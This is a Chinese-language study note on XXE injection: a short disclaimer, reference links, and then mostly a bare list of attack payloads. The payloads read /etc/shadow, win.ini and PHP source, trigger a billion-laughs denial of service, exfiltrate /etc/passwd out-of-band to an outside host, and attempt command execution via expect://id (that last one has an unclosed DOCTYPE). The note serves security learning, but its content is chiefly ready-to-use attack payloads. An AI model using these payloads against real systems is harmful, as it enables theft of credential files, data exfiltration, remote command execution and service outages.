# XXE 笔记

---

## 免责声明

`本人撰写的手册,仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`

---

## Refence

---

**文章**
- [XXE 漏洞的学习与利用总结](https://www.cnblogs.com/r00tuser/p/7255939.html)
- [XXE 漏洞利用技巧：从 XML 到远程代码执行](https://www.freebuf.com/articles/web/177979.html)
- [XXE: XML eXternal Entity Injection vulnerabilities](https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/)
- [浅谈 XXE 攻击](https://www.freebuf.com/articles/web/126788.html)


**靶场**
- [c0ny1/xxe-lab: 一个包含 php,java,python,C# 等各种语言版本的 XXE 漏洞 Demo](https://github.com/c0ny1/xxe-lab)
- [TheTwitchy/vulnd_xxe](https://github.com/TheTwitchy/vulnd_xxe)

**议题**
- [Build Your SSRF Exploit Framework —— 一个只影响有钱人的漏洞](../../assets/file/安全/议题报告/WhiteHatFest2016/一个只影响有钱人的漏洞.pdf)

**payload**
- [bugbounty-cheatsheet/cheatsheets/xxe.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md)

---

## 一些 Payload

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

```
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///c:/windows/win.ini"> ]>

<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=file:///var/www/html/xxe/aaa.php">]>
```

```
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % pe SYSTEM "http://tester.example.com/xxe_file">
%pe;
%param1;
]>
<foo>&external;</foo>

The contents of xxe_file should be:
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://tester.example.com/log_xxe?data=%payload;'>">
```

```
<!--?xml version="1.0" ?-->
<!DOCTYPE name [
<!ENTITY lol SYSTEM "expect://id">
<name>&lol;</name>
```
